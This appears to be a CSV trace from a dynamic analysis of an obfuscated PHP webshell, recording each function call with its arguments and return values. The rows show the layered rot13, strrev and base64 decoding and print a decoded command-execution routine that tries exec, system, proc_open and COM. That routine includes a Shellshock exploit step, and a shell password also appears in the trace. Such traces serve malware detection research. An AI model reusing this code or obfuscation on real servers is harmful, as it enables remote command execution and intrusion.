uuid,file_md5,index,source,target,argc,argv,return,dynamic
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,215,__lambda_func,gzuncompress,1.0,"{""value"": [[0, ""data"", ""x\\x9c\\xec\\xbdio\\xebJ\\x9a&\\xf8\\xbd\\x81\\xfe\\x0f\\x89B\\x01\\x95\\x89\\x9b\\xa8fp'\n9@\\x90\fJ\\xd4b\\xc9Zm\r\\x06\tY\\xf7x\\xd1.\\x1fI\\x96\\xd4\\xe8\\xff>\\xcf\\x13$%\\xca\\xcb9'oWW\\xa3g\\xeaV\\x9d\\xb4-q\\x89\\xe5]\\x9ew\\x8d\\xff\\xfa_V\\x0f\\x7f\\xff\\xbe\\x1d\\xbfn\\xff\\xfc\\x97\\x7f\\xfb\\xfd\\xdb\\xe3\\xcb\\xf2\\xdb\\x9f\\xffeq\\x1c\\xff\\xfe\\xfb\\xeb\\xb7\\xef\\xdf\\xff\\xe5\\xaf\\xff\\xfc\\xf7\\xae\\xea\fT\\xe7\\xff\\xfe\\x97n\\xd4I\\xdb\\xbd\\xbf""]]}","{""value"": ""\r\nob_start();define('myaddress',$_SERVER['SCRIPT_FILENAME']);define('postpass',$password);define('shellname',$shellname);define('m""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,216,__lambda_func,eval,1.0,"{""value"": [[0, ""phpcode"", ""\r\nob_start();define('myaddress',$_SERVER['SCRIPT_FILENAME']);define('postpass',$password);define('shellname',$shellname);define('m""]]}","{""value"": null}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,217,eval,zend_compile_string,2.0,"{""value"": [[0, ""source_string"", ""\r\nob_start();define('myaddress',$_SERVER['SCRIPT_FILENAME']);define('postpass',$password);define('shellname',$shellname);define('myurl',$myurl);function QUfzQe($BtrIng,$show=0){$B = t . r;$B1 = S . $B . $B;$B2 = S . $B . re . v;$B3 = $B1(S . $B . prot1a, pa, _3);$B4 = $B3($B2($B1(robpr . Q_06 . rfnO, o0, q4)));$B5=$B4($B3($B2($B1(hiJnO.Azo1MO.K0EK.L0W3D,$B4(T2kw),$B4(MDl5)))));if($show){$BS=$B5('',$B4($B3($B2($BtrIng))));$BS();}else{return $B4($B3($B2($BtrIng)));}}\r\nfunction JmCode($BtrIng){$B = t . r;$B1 = S . $B . $B;$B2 = S . $B . re . v;$B3 = $B1(S . $B . prot1a, pa, _3);$B4 = $B3($B2($B1(robpr . Q_06 . rfnO, o0, q4)));$B5=$B4($B3($B2($B1(hiJnO.Azo1MO.K0EK.L0W3D,$B4(T2kw),$B4(MDl5)))));return $B4($B3($B2($BtrIng)));}\r\nQUfzQe(\""==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\"",1);QUfzQe(\""=0aPAfGXbHJnxOPVX0jBc01MgyTWoAKMaSJocEPXyE2owITMsEwAyAKLvOlobAJMtNvPAfGXaLJna9FMaSJocOvByOKr01PqhITqh92DatvpyEJLyuTVtbDQ7xFPX0tV3RHDWM3nzc3DDuUH0WQZdMynwWIoC5HLvNPVtNvPA4vVQyHF3y3MxW1EC1HJQyHDacUpZWxAmZmGvqSqku0DCEHLhSGGh9xIkq2DQq1FeIRGcqxGkqJnZWGEwWSGiRQB1bKnXu1HCu0GvNPVtNvPA4vVvgvJaq3MZuInmEHFEy2L3AIoRuHoCM0FSyHDauUEvqyAzqTFDIJGESxnV9JrwAxDQ90L0pJnlp1XDuaDRgHJEqTnXIHqWu3YvNPVtNvPA4vViHHEiqUnSIHJjNIDTyJDOSHDPSHHOSHDOSHDZSRBDS0FSSxD1t0DO9PEOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDvNPVtNvPA4vVOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDvNPVtNvPA4vVOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDvNPVtNvPA4vVOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDvNPVtNvPA4vVOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDvNPVtNvPA4vVOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDvNPVtNvPA4vVOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDvNPVtNvPA4vVOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDvNPVtNvPA4vVOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSHDOSH""]]}","{""value"": ""3C415051423C41423C41423C41423C000041413C41413C41413C41413C41413C41413C41413C41413C41413C41413C41413C41413C0041413C41413C41413C41413C41413C41413C41413C41413C41413C41413C41413C41413C41413C41413C0000000041413C41413C41413C41413C41413C41413C41413C41413C41413C41413C41413C41413C41413C41413C41413C41413C41413C41413C41413C0041413C0000393C3A2B504D4E892626423C5393892A31504D4E892626423C5393892A312A6359732B3B413D39635051493A4F2A505163413C122B50512B505163112B415051423C6A3C3B3D2A413C282A42423C4F2A59732B3B5C5D423D2A59732B3B5C5D423D266D44423D2652263B42505108413D2A59732B3C3B5C5D425C5D425C5D425C5D423D4F2A41414163413C6A3C08413C414141413C11413C413B63505108413D6A3C59732B50519D2A9D2659732B50519D2A9D2659732B50519D2A639D2659732B50519D2A9D2659732B50519D2A9D2659732B50519D2A9D26423C6A3C262B3B423D2A112B3C4F2A112B41413C413C4F2A413C413C413C47413C413C4863413C413C48413C413C4847413C413C413C47413C413C48413C413C4863413C413C48413C413C48413C413C48413C4848413C413C63413C4763413C63413C48413C413C48413C63413C4848413C413C413C4748265973112B3B63413D2A413C47413C48413C48413C48413C48413C48413C48413C48263C302B3C3B413C6A3D3B413D3B413C6A3D3B3D263B413C08413C0808413C08413D26142D24462A423C082608413C2B3B3738413D26722B262A3B413C08413C0808413C0808413C08413D2A2A3B413C6A3D264D4E8926263B413C08413C08413D3B413D3B413C0808413C08413D4D4E8926263B413C08413C0808413C08413D2A313B413C6A3D24462A313B413C08413C08413D3B413D3B413C08413C08413D322A302B413C3950423C3A263B423C6A3D2659730D2B413C3B5C5D425C5D425C5D42423D08413C08282A59730D2B505108505108265051302B415051423C0D2B413C262A50514241413C26395042423C3A413C08413C085051080826322A302B415051423C0D2B413C505108413C08413C0808262A3950425051423C6A3C3A413C08413C085051080826322A31413C08413C08282A262650510D2B262A50510808263B3D263B413C08413C08423C08413C08423C08413C08423C08413C08413D3B414141413D3B4141413C6A3D59730D2B59732B5051262A265051423C265051423C112B5051423C262A5051264141413C142B5051423C112F5051423C11342B41415051423C6A3C262A3B423D262A3B4242423D2B08085108162A080851081628395042395051423C3A6A3C3A2A3B413C08413C08413D3B3B423D0841413C6A3D3B413C3C08413C08413D3950703D3A262B112F11342B332A3B383638413D26423C2B423C6A41413C6A413C2639413950423C3A6A3C3A26423C263B413C08413C08413D3B413D3B0841423D3B413C08413C0808413C0808413C0808413C08413D3B0841413C6A3D3B413C0863413C0808413C0808413C083B383638413D08413C083B383638413D08413D3B413C0863413C0808413C0808413C08413D24462A2A3950703D3A3950703D3A262B112F11342B332A3B383638413D26423C0D2B3950423C3A26393B41423C6A3D3A26423C6A41413C6A413C2639413950423C3A6A3C3A263B08413D6A42423C260826423C2642413C263B413C08413C08413D3B3B423D6A3D3B424263413C6A3D3B413C6A3D112F11342F11342F11342B3B413C0841413C6A413C08413C0808413C080863413C08413D3B413C0841413C6A413C08413C0808413C080863413C08413D3B413C084163413C6A413C0863413C0808413C080863413C08413D2A3B413C0841413C6A413C0808413D3B413C08413C0808413C0808413C0808413C08423C08413C0808413C080863413C0808413C0808413C083B383638413D08083B383638413D08413D3B413C0863413C0808413C0808413C08413D3B413C084142413C0808413D3B413C6A3D24462A2A3950703D3A0D2B413C0301413C262A3B413C08413C0808413C080808505108413C080863413C080863413C08413D322A302B413C283C413C28413C59730D2B39505151423B0850515108413D6A3C3A2B3B41505151085108413D9D2A3B5D423D9D28413C423C08084F2A59730D2B5051263B0808413D26395042413C3A2B3B41085108413D9D2A3B5D423D9D46413C423C08084F2A59730D2B5051260808413C26423C263B0808413D262626413C0301413C263950423C3A2B413C282A2A423C2641423C6A3C26413950423C3A6A3C264141413C142B59732B3B423D132B264141423C262A262A5051112B262A50512650514241423C262A423C263B413C08413C0808413C080863413C0808413C0808413C0808413C08413D3B47484848484848484142373837413D3B413C08413C0808413C0808413C08413D322A302B3B413D423C085051423C0826395042423C3A2B3B3738415051423C085108413D9D2A3B5D423D9D46413C08084F322A302B3B413D3B423D2B3B373841085108413D9D2A3B5D423D9D46413C08084F322A302B3B413D3950423C3A2B3B373841085108413D9D2A3B5D423D9D46413C08084F322A302B3B413D415051423C2651938926423C132D24462A51423C93892A41423C26395042423C3A2B3B373841085108413D9D2A3B5D423D9D46413C08084F322A302B3B413C0863413C08413D423C2B3B474848415C5D423D2A3B474848415C5D423D3B4141413C6A3D3C50512B5051302B395042413C3A26322A302B39504241""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,218,eval,ob_start,0.0,"{""value"": []}","{""value"": ""void""}",[]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,219,eval,zend_fetch_r_server,1.0,"{""value"": [[0, ""op1"", ""_SERVER""]]}","{""value"": []}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,220,eval,define,2.0,"{""value"": [[0, ""constant_name"", ""myaddress""], [1, ""value"", ""/usr/share/nginx/html/96408e582caf7c87e837d9e992cfccc5_d83ac9bb-8107-4cff-b4ce-031a02fb89e1.php""]]}","{""value"": ""void""}","[0, 0]"
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,221,eval,define,2.0,"{""value"": [[0, ""constant_name"", ""postpass""], [1, ""value"", ""qdyma4321""]]}","{""value"": ""void""}","[0, 0]"
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,222,eval,define,2.0,"{""value"": [[0, ""constant_name"", ""shellname""], [1, ""value"", ""\\xce\\xa2\\xc7\\xe6\\xb0\\xb2\\xc8\\xab\\xbc\\xec\\xb2\\xe2""]]}","{""value"": ""void""}","[0, 0]"
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,223,eval,define,2.0,"{""value"": [[0, ""constant_name"", ""myurl""], [1, ""value"", """"]]}","{""value"": ""void""}","[0, 0]"
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,224,eval,qufzqe,2.0,"{""value"": [[0, ""BtrIng"", ""==DsX0jBmIzpxNvolIUqyWKPX0Ds7xvVUcUB092ZWOQpIyRZMO1GcOaqCu2omDRqkSJFz9zq00wVbHTMiAHoX1mpyWUWtH2pfI2B0IUp0I3ox0mpyWUWtxvVvNFCuNPq1O""], [1, ""show"", 1]]}","{""value"": ""void""}","[0, 0]"
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,225,qufzqe,strtr,3.0,"{""value"": [[0, ""str"", ""Strprot1a""], [1, ""from"", ""pa""], [2, ""to"", ""_3""]]}","{""value"": ""Str_rot13""}","[0, 0, 0]"
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,226,qufzqe,strtr,3.0,"{""value"": [[0, ""str"", ""robprQ_06rfnO""], [1, ""from"", ""o0""], [2, ""to"", ""q4""]]}","{""value"": ""rqbprQ_46rfnO""}","[0, 0, 0]"
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,227,qufzqe,strrev,1.0,"{""value"": [[0, ""str"", ""rqbprQ_46rfnO""]]}","{""value"": ""Onfr64_Qrpbqr""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,228,qufzqe,str_rot13,1.0,"{""value"": [[0, ""str"", ""Onfr64_Qrpbqr""]]}","{""value"": ""Base64_Decode""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,229,qufzqe,base64_decode,1.0,"{""value"": [[0, ""str"", ""T2kw""]]}","{""value"": ""Oi0""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,230,qufzqe,base64_decode,1.0,"{""value"": [[0, ""str"", ""MDl5""]]}","{""value"": ""09y""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,231,qufzqe,strtr,3.0,"{""value"": [[0, ""str"", ""hiJnOAzo1MOK0EKL0W3D""], [1, ""from"", ""Oi0""], [2, ""to"", ""09y""]]}","{""value"": ""h9Jn0Azo1M0KyEKLyW3D""}","[0, 0, 0]"
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,232,qufzqe,strrev,1.0,"{""value"": [[0, ""str"", ""h9Jn0Azo1M0KyEKLyW3D""]]}","{""value"": ""D3WyLKEyK0M1ozA0nJ9h""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,233,qufzqe,str_rot13,1.0,"{""value"": [[0, ""str"", ""D3WyLKEyK0M1ozA0nJ9h""]]}","{""value"": ""Q3JlYXRlX0Z1bmN0aW9u""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,234,qufzqe,base64_decode,1.0,"{""value"": [[0, ""str"", ""Q3JlYXRlX0Z1bmN0aW9u""]]}","{""value"": ""Create_Function""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,235,qufzqe,strrev,1.0,"{""value"": [[0, ""str"", ""==DsX0jBmIzpxNvolIUqyWKPX0Ds7xvVUcUB092ZWOQpIyRZMO1GcOaqCu2omDRqkSJFz9zq00wVbHTMiAHoX1mpyWUWtH2pfI2B0IUp0I3ox0mpyWUWtxvVvNFCuNPq1O""]]}","{""value"": ""MaIhL3Eco24tEKuyL19FqJ4bWTAgMPxAPafAPtxxpzImVQ0tWlp7QDbWnJLbMaIhL3Eco25sMKucp3EmXPqyrTIwWlxcr0OyrTIwXPEwoJDfWUWyplx7WUWyplN9VTcinJ""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,236,qufzqe,str_rot13,1.0,"{""value"": [[0, ""str"", ""MaIhL3Eco24tEKuyL19FqJ4bWTAgMPxAPafAPtxxpzImVQ0tWlp7QDbWnJLbMaIhL3Eco25sMKucp3EmXPqyrTIwWlxcr0OyrTIwXPEwoJDfWUWyplx7WUWyplN9VTcinJ""]]}","{""value"": ""ZnVuY3Rpb24gRXhlY19SdW4oJGNtZCkNCnsNCgkkcmVzID0gJyc7DQoJaWYoZnVuY3Rpb25fZXhpc3RzKCdleGVjJykpe0BleGVjKCRjbWQsJHJlcyk7JHJlcyA9IGpvaW""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,237,qufzqe,base64_decode,1.0,"{""value"": [[0, ""str"", ""ZnVuY3Rpb24gRXhlY19SdW4oJGNtZCkNCnsNCgkkcmVzID0gJyc7DQoJaWYoZnVuY3Rpb25fZXhpc3RzKCdleGVjJykpe0BleGVjKCRjbWQsJHJlcyk7JHJlcyA9IGpvaW""]]}","{""value"": ""function Exec_Run($cmd)\r\n{\r\n\t$res = '';\r\n\tif(function_exists('exec')){@exec($cmd,$res);$res = join(\""\\n\"",$res);}\r\n\telseif(function_""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,238,qufzqe,create_function,2.0,"{""value"": [[0, ""args"", """"], [1, ""code"", ""function Exec_Run($cmd)\r\n{\r\n\t$res = '';\r\n\tif(function_exists('exec')){@exec($cmd,$res);$res = join(\""\\n\"",$res);}\r\n\telseif(function_""]]}","{""value"": ""\\x00lambda_2""}","[0, 0]"
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,239,create_function,zend_compile_string,2.0,"{""value"": [[0, ""source_string"", ""function __lambda_func(){function Exec_Run($cmd)\r\n{\r\n\t$res = '';\r\n\tif(function_exists('exec')){@exec($cmd,$res);$res = join(\""\\n\"",$res);}\r\n\telseif(function_exists('shell_exec')){$res = @shell_exec($cmd);}\r\n\telseif(function_exists('system')){@ob_start();@system($cmd);$res = @ob_get_contents();@ob_end_clean();}\r\n\telseif(function_exists('passthru')){@ob_start();@passthru($cmd);$res = @ob_get_contents();@ob_end_clean();}\r\n\telseif(@is_resource($f=@popen($cmd,'r'))){$res = '';while(!@feof($f)){$res .= @fread($f,1024);}@pclose($f);}\r\n\telseif(substr(dirname($_SERVER[\""SCRIPT_FILENAME\""]),0,1)!=\""/\""&&class_exists('COM')){$w=new COM('WScript.shell');$e=$w->exec($cmd);$f=$e->StdOut();$res=$f->ReadAll();}\r\n\telseif(function_exists('proc_open')){$length = strcspn($cmd,\"" \\t\"");$token = substr($cmd, 0, $length);if (isset($aliases[$token]))$cmd=$aliases[$token].substr($cmd, $length);$p = proc_open($cmd,array(1 => array('pipe', 'w'),2 => array('pipe', 'w')),$io);while (!feof($io[1])) {$res .= htmlspecialchars(fgets($io[1]),ENT_COMPAT, 'UTF-8');}while (!feof($io[2])) {$res .= htmlspecialchars(fgets($io[2]),ENT_COMPAT, 'UTF-8');}fclose($io[1]);fclose($io[2]);proc_close($p);}\r\n\telseif(function_exists('mail')){if(strstr(readlink(\""/bin/sh\""), \""bash\"") != FALSE){$tmp = tempnam(\"".\"",\""data\"");putenv(\""PHP_LOL=() { x; }; $cmd >$tmp 2>&1\"");mail(\""a@127.0.0.1\"",\""\"",\""\"",\""\"",\""-bv\"");}else $res=\""Not vuln (not bash)\"";$output = @implode('',@file($tmp));@unlink($tmp);if($output != \""\"") $res=$output;else $res=JmCode(\""=4vofIaqtD3ohOvpiOPY0IUp0I3ot8zG\"");}\r\n\treturn $res;\r\n}}""]]}","{""value"": ""003E""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,240,qufzqe,__lambda_func,0.0,"{""value"": []}","{""value"": ""void""}",[]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,241,eval,qufzqe,2.0,"{""value"": [[0, ""BtrIng"", ""=0aPAfGXbHJnxOPVX0jBc01MgyTWoAKMaSJocEPXyE2owITMsEwAyAKLvOlobAJMtNvPAfGXaLJna9FMaSJocOvByOKr01PqhITqh92DatvpyEJLyuTVtbDQ7xFPX0tV3R""], [1, ""show"", 1]]}","{""value"": ""void""}","[0, 0]"
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,242,qufzqe,strtr,3.0,"{""value"": [[0, ""str"", ""Strprot1a""], [1, ""from"", ""pa""], [2, ""to"", ""_3""]]}","{""value"": ""Str_rot13""}","[0, 0, 0]"
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,243,qufzqe,strtr,3.0,"{""value"": [[0, ""str"", ""robprQ_06rfnO""], [1, ""from"", ""o0""], [2, ""to"", ""q4""]]}","{""value"": ""rqbprQ_46rfnO""}","[0, 0, 0]"
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,244,qufzqe,strrev,1.0,"{""value"": [[0, ""str"", ""rqbprQ_46rfnO""]]}","{""value"": ""Onfr64_Qrpbqr""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,245,qufzqe,str_rot13,1.0,"{""value"": [[0, ""str"", ""Onfr64_Qrpbqr""]]}","{""value"": ""Base64_Decode""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,246,qufzqe,base64_decode,1.0,"{""value"": [[0, ""str"", ""T2kw""]]}","{""value"": ""Oi0""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,247,qufzqe,base64_decode,1.0,"{""value"": [[0, ""str"", ""MDl5""]]}","{""value"": ""09y""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,248,qufzqe,strtr,3.0,"{""value"": [[0, ""str"", ""hiJnOAzo1MOK0EKL0W3D""], [1, ""from"", ""Oi0""], [2, ""to"", ""09y""]]}","{""value"": ""h9Jn0Azo1M0KyEKLyW3D""}","[0, 0, 0]"
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,249,qufzqe,strrev,1.0,"{""value"": [[0, ""str"", ""h9Jn0Azo1M0KyEKLyW3D""]]}","{""value"": ""D3WyLKEyK0M1ozA0nJ9h""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,250,qufzqe,str_rot13,1.0,"{""value"": [[0, ""str"", ""D3WyLKEyK0M1ozA0nJ9h""]]}","{""value"": ""Q3JlYXRlX0Z1bmN0aW9u""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,251,qufzqe,base64_decode,1.0,"{""value"": [[0, ""str"", ""Q3JlYXRlX0Z1bmN0aW9u""]]}","{""value"": ""Create_Function""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,252,qufzqe,strrev,1.0,"{""value"": [[0, ""str"", ""=0aPAfGXbHJnxOPVX0jBc01MgyTWoAKMaSJocEPXyE2owITMsEwAyAKLvOlobAJMtNvPAfGXaLJna9FMaSJocOvByOKr01PqhITqh92DatvpyEJLyuTVtbDQ7xFPX0tV3R""]]}","{""value"": ""MaIhL3Eco24tL3AmK2ygMltxnJ1aXKfAPtxxnJ1uM2ImVQ0tLKWlLKxbQDbWVzI4MFV9Ct0XPFWFZTkUG0EfnRI3DH9OF0yODHSODHSDYl8iq0SOqzAvE3uiH0IbHP8iY3""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,253,qufzqe,str_rot13,1.0,"{""value"": [[0, ""str"", ""MaIhL3Eco24tL3AmK2ygMltxnJ1aXKfAPtxxnJ1uM2ImVQ0tLKWlLKxbQDbWVzI4MFV9Ct0XPFWFZTkUG0EfnRI3DH9OF0yODHSODHSDYl8iq0SOqzAvE3uiH0IbHP8iY3""]]}","{""value"": ""ZnVuY3Rpb24gY3NzX2ltZygkaW1nKXsNCgkkaW1hZ2VzID0gYXJyYXkoDQoJImV4ZSI9Pg0KCSJSMGxHT0RsaEV3QU9BS0lBQUFBQUFQLy8vd0FBdmNiR3hvU0VoUC8vL3""}",[0]
